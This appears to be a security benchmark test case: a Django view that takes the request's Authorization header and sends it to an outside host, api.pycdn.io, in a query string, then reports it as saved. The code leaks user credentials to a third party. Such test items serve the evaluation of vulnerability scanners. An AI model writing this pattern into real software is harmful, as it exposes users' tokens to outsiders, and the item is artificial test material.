# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests
import urllib.request
import urllib.parse
import ssl


def ensure_str(value):
    return str(value)

def BenchmarkTest06021(request):
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    data = ensure_str(auth_header)
    ctx = ssl.create_default_context()
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return JsonResponse({"saved": True})
